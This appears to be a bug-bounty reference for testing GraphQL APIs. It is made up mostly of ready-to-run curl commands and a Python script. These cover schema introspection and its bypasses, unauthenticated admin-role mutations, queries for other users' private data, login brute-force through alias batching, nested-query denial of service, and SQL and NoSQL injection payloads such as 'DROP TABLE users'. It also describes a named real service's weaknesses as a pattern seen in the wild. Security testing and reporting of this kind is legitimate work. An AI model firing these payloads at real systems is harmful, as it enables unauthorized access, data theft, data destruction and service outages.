# GraphQL Testing Reference

## Introspection

### Full Schema Dump
```bash
# Query type (read operations)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description args { name type { name kind ofType { name } } } } } } }"}'

# Mutation type (write operations)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name description args { name type { name kind ofType { name } } } } } } }"}'

# Subscription type
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { subscriptionType { fields { name } } } }"}'

# All types with fields
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }"}'
```

### Introspection Disabled — Bypass Attempts
```bash
# Field suggestion exploitation (typo-based)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ usrs { id } }"}'
# Error: "Did you mean 'users'?" → reveals field names

# __type query (sometimes allowed when __schema is blocked)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}'

# GET request (some WAFs only block POST introspection)
curl -s "$URL/graphql?query=%7B__schema%7BqueryType%7Bfields%7Bname%7D%7D%7D%7D"
```

## Authentication & Authorization

### Unauthenticated Access
```bash
# Test every query/mutation without auth header
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email role } }"}'

# Test mutations without auth
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(id:\"1\", input:{role:\"admin\"}) { id role } }"}'
```

### Object-Level Authorization (BOLA)
```bash
# Query other users' data with your token
curl -s "$URL/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ user(id:\"OTHER_USER_ID\") { email phone ssn } }"}'

# Nested object access (user → orders → other user's orders)
curl -s "$URL/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ order(id:\"OTHER_ORDER_ID\") { items total shippingAddress { street city } } }"}'
```

## Batching & Amplification

### Alias Batching
```bash
# Execute multiple operations in one request
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation { a:login(email:\"user@test.com\",password:\"pass1\") { token } b:login(email:\"user@test.com\",password:\"pass2\") { token } c:login(email:\"user@test.com\",password:\"pass3\") { token } }"}'
# If all execute → rate limiting bypass for brute-force
```

### Array Batching
```bash
# Multiple queries in array format
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:\"1\") { email } }"},{"query":"{ user(id:\"2\") { email } }"},{"query":"{ user(id:\"3\") { email } }"}]'
# Often disabled ("Batching is not enabled") but alias batching still works
```

### Mutation Amplification
```bash
# Create 100 resources in one request
QUERY="mutation {"
for i in $(seq 1 100); do
  QUERY="$QUERY a$i:createItem(input:{name:\"item$i\"}) { id }"
done
QUERY="$QUERY }"
curl -s "$URL/graphql" -H "Content-Type: application/json" -d "{\"query\":\"$QUERY\"}"
```

## Denial of Service

### Depth Attack
```bash
# Deeply nested query (no depth limit = DoS)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { author { posts { author { posts { author { name } } } } } } } }"}'
# If returns data at depth 7+ → no depth limiting
```

### Width Attack
```bash
# Request all fields on all types
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users { id name email phone address { street city state zip country } orders { id items { name price quantity } } } }"}'
```

### Circular Fragment
```graphql
fragment A on User { posts { ...B } }
fragment B on Post { author { ...A } }
query { users { ...A } }
```

## Injection

### SQL Injection via Arguments
```bash
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users(filter:{name:\"admin\\\" OR 1=1--\"}) { id email } }"}'
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users(orderBy:\"name; DROP TABLE users--\") { id } }"}'
```

### NoSQL Injection
```bash
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:{\"$gt\":\"\"}) { id email } }"}'
```

## Subscriptions (WebSocket)

```bash
# Connect to subscription endpoint
wscat -c "wss://$HOST/graphql" -x '{"type":"connection_init","payload":{}}'
# Subscribe to events (may bypass auth)
# Send: {"type":"start","id":"1","payload":{"query":"subscription { newMessage { content sender } }"}}
```

## Information Disclosure

### Error-Based Enumeration
```bash
# Invalid field → reveals valid fields in error
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:\"1\") { nonexistent } }"}'
# "Cannot query field 'nonexistent' on type 'User'. Did you mean 'name', 'email'?"

# Type confusion → reveals type structure
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"INVALID\") { name } }"}'
```

### Debug Mode
```bash
# Some implementations expose debug info
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { directives { name locations args { name } } } }"}'
# Look for: @deprecated, @auth, @hasRole, @rateLimit directives
```

## Write Operations Exposed as Queries

Some implementations expose write/state-changing operations under the `queryType` instead of `mutationType`. Always check:

```bash
# Check if queryType has write-like fields
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { name } } }"}'
# If mutationType is null but queryType has "send", "create", "update", "batch_*" → write ops as queries
```

**Pattern seen in the wild (LINE WORKS `cxtalk-service`):**
- `batch_send_message`, `batch_join_chat`, `batch_forward_message`, `set_user_options` all under `queryType`
- No `mutationType` defined at all
- Server processes write requests (returns business errors like "channel not found") rather than auth errors

**Impact escalation:** When write ops are queries, any CSRF/CORS misconfiguration or cookie-sharing across subdomains gives full write access — queries are often less protected than mutations in middleware.

## Amplification Measurement (DoS Proof)

Systematic timing measurement to prove no complexity limits:

```python
import httpx, time

client = httpx.Client(verify=False, timeout=30)
URL = "https://target.com/graphql"

print("Aliases | Time(s) | Response Size | Amplification")
for count in [1, 10, 50, 100, 200, 500]:
    query = "{ " + " ".join(
        f'a{i}: someQuery(id: {i}) {{ message }}' for i in range(count)
    ) + " }"
    start = time.time()
    r = client.post(URL, json={"query": query}, headers={"Content-Type": "application/json"})
    elapsed = time.time() - start
    print(f"  {count:>4} | {elapsed:.3f}s | {len(r.text):>6}b | {len(r.text)//max(len(query),1)}x")
# Linear time scaling = no complexity limit = DoS
# Server timeout at high alias count = resource exhaustion confirmed
```

**Reporting:** Include the timing table in the finding. Linear scaling proves absence of query cost analysis. A timeout at 1000 aliases proves actual resource exhaustion.

## Input Type Introspection Workflow

When queries fail with type coercion errors, systematically introspect input types:

```bash
# Step 1: Get argument types for a field
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"query\") { fields { name args { name type { name kind ofType { name kind ofType { name kind } } } } } } }"}'

# Step 2: Introspect INPUT_OBJECT types (for complex arguments)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"param_join_user_info\") { name kind inputFields { name type { name kind ofType { name } } } } }"}'
```

**Key type gotchas:**
- `NON_NULL(Float)` vs `NON_NULL(String)` — GraphQL won't coerce between them
- `LIST(NON_NULL(InputObject))` — must pass array of objects with exact field names
- Error messages like `"Could not coerce \"1\" to \"Float\""` mean the arg IS String type (confusing!)
- Some implementations use Float where you'd expect Int (Lua/OpenResty pattern)

## Architecture Detection via Error Messages

Error message patterns reveal backend architecture:

| Error Pattern | Architecture |
|--------------|--------------|
| `"attempt to index field 'X' (a nil value)"` | Lua / OpenResty |
| `"Cookie error"` in `_rawdata_` | GraphQL gateway → cookie-auth backend (no auth on gateway) |
| `"parser expects a string"` | Custom Lua GraphQL parser |
| `"Required argument X was not supplied"` | Standard graphql-lua validation |

**"Cookie error" pattern:** GraphQL layer processes everything without auth. Backend requires a session cookie. The GraphQL gateway is the vulnerability — it should enforce auth BEFORE forwarding to backend. An attacker with a valid cookie (XSS, session fixation, same-site cookie scope) bypasses all intended access control.

## Report Splitting Strategy (Bug Bounty)

When a single GraphQL endpoint yields multiple issues, submit as SEPARATE findings — different CWEs = different payouts:

| Report | CWE | Impact Vector | Severity |
|--------|-----|---------------|----------|
| Schema disclosure + write ops reach backend | CWE-306 (Missing Auth) | C/I | Medium-High |
| Query batching DoS (alias amplification) | CWE-770 (Resource Allocation Without Limits) | A | High |
| BOLA via field-level access | CWE-639 (Auth Bypass via User-Controlled Key) | C | High |

**Do NOT combine** availability (DoS) with confidentiality/integrity (schema leak + write ops) — they have different CVSS vectors and different remediation paths.

**DoS proof requirements:**
- Timing table showing linear scaling (1→10→50→100→500 aliases)
- Server timeout or >20s response at high alias count (1000 aliases)
- Rate limit absence proof (20 rapid requests, all 200 OK)
- Single request → N backend operations framing (amplification factor)

**Schema disclosure proof requirements:**
- Full introspection response showing sensitive operations
- Write operations returning business errors (not auth errors) — proves gateway has no auth
- Internal architecture leak via error messages (e.g., Lua stack traces)
- Chain potential: "one XSS on any subdomain = full API access" when cookie-auth backend pattern detected

## Severity Matrix

| Finding | Severity | Condition |
|---------|----------|-----------|
| Introspection enabled (prod) | Low-Medium | Depends on what's exposed |
| Unauthenticated mutations | High-Critical | Write operations without auth |
| Write ops as queries (no auth) | High-Critical | State-changing ops reachable unauthenticated |
| BOLA via nested queries | High | Access other users' data |
| No depth/complexity limit | Medium | DoS potential |
| No alias limit + linear scaling | Medium-High | Proven resource exhaustion |
| Alias batching + no rate limit | Medium-High | Brute-force amplification |
| SQL injection in arguments | Critical | Data breach |
| Subscription auth bypass | Medium-High | Real-time data leak |
| Gateway no-auth + backend cookie-auth | High | One XSS = full API access |
